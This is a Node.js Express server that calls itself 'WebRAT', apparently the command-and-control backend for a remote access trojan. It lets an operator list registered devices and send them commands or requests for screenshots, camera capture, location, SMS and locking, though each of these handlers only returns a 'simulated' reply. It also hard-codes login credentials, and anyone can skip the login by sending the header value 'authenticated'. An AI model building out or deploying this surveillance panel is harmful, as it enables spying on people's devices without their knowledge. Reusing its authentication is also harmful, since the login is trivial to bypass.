const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();

// Security Configuration
const LOGIN_CREDENTIALS = {
  username: 'Jayjay100!',
  password: 'Jayjay100!'
};

// CORS configuration for Vercel
app.use(cors({
  origin: [
    'https://webrat.vercel.app', 
    'http://localhost:5000',
    /^https:\/\/.*\.vercel\.app$/, // Allow all Vercel preview deployments
    /^http:\/\/localhost:\d+$/ // Allow any localhost port
  ],
  credentials: true
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// In-memory storage for demo (will reset on each deployment)
let authenticatedSessions = new Set();
let connectedDevices = [];

// Authentication middleware
const requireAuth = (req, res, next) => {
  const authHeader = req.headers.authorization;
  const sessionToken = req.headers['x-session-token'];
  
  if (authHeader === 'Basic SmF5amF5MTAwITpKYXlqYXkxMDAh' || 
      sessionToken === 'authenticated' ||
      authenticatedSessions.has(req.ip)) {
    next();
  } else {
    res.status(401).json({ error: 'Authentication required' });
  }
};

// Routes
app.get('/api/auth/status', (req, res) => {
  const isAuth = authenticatedSessions.has(req.ip);
  res.json({ 
    authenticated: isAuth,
    user: isAuth ? { username: LOGIN_CREDENTIALS.username } : null
  });
});

app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  
  if (username === LOGIN_CREDENTIALS.username && password === LOGIN_CREDENTIALS.password) {
    authenticatedSessions.add(req.ip);
    res.json({ 
      success: true, 
      message: 'Login successful',
      user: { username }
    });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

app.post('/api/logout', (req, res) => {
  authenticatedSessions.delete(req.ip);
  res.json({ success: true, message: 'Logged out successfully' });
});

// Device management endpoints
app.get('/api/devices', requireAuth, (req, res) => {
  res.json(connectedDevices);
});

app.post('/api/devices/register', (req, res) => {
  const { deviceId, name, clientType, deviceInfo } = req.body;
  
  const deviceData = {
    id: deviceId,
    name: name || `Device ${deviceId}`,
    type: clientType || 'unknown',
    ip: req.ip,
    osInfo: deviceInfo || {},
    deviceType: clientType === 'mobile' ? 'mobile' : 'desktop',
    status: 'online',
    lastSeen: Date.now()
  };
  
  // Remove existing device with same ID
  connectedDevices = connectedDevices.filter(d => d.id !== deviceId);
  connectedDevices.push(deviceData);
  
  res.json({ success: true, message: 'Device registered' });
});

app.post('/api/devices/:deviceId/command', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const { command, type } = req.body;
  
  const device = connectedDevices.find(d => d.id === deviceId);
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  // In a real implementation, this would send the command via WebSocket
  // For now, we'll just simulate success
  res.json({ success: true, message: 'Command sent (simulated)' });
});

app.post('/api/devices/:deviceId/screenshot', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const device = connectedDevices.find(d => d.id === deviceId);
  
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  res.json({ success: true, message: 'Screenshot request sent (simulated)' });
});

app.post('/api/devices/:deviceId/camera', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const device = connectedDevices.find(d => d.id === deviceId);
  
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  res.json({ success: true, message: 'Camera request sent (simulated)' });
});

app.post('/api/devices/:deviceId/location', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const device = connectedDevices.find(d => d.id === deviceId);
  
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  res.json({ success: true, message: 'Location request sent (simulated)' });
});

app.post('/api/devices/:deviceId/sms', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const { number, text } = req.body;
  const device = connectedDevices.find(d => d.id === deviceId);
  
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  if (device.deviceType !== 'mobile') {
    return res.status(400).json({ error: 'SMS only available for mobile devices' });
  }
  
  res.json({ success: true, message: 'SMS request sent (simulated)' });
});

app.post('/api/devices/:deviceId/lock', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const device = connectedDevices.find(d => d.id === deviceId);
  
  if (!device) {
    return res.status(404).json({ error: 'Device not found' });
  }
  
  res.json({ success: true, message: 'Lock request sent (simulated)' });
});

// WebSocket endpoint (simplified for Vercel)
app.get('/ws', (req, res) => {
  res.json({ 
    message: 'WebSocket endpoint - use polling for device updates in serverless environment',
    devices: connectedDevices.length 
  });
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'healthy',
    timestamp: new Date().toISOString(),
    devices: connectedDevices.length,
    environment: 'serverless'
  });
});

// Default route
app.get('/', (req, res) => {
  res.json({ 
    message: 'WebRAT API Server',
    version: '2.0.0',
    environment: 'serverless'
  });
});

// Error handling middleware
app.use((error, req, res, next) => {
  console.error('Server error:', error);
  res.status(500).json({ error: 'Internal server error' });
});

// Export for Vercel
module.exports = app;
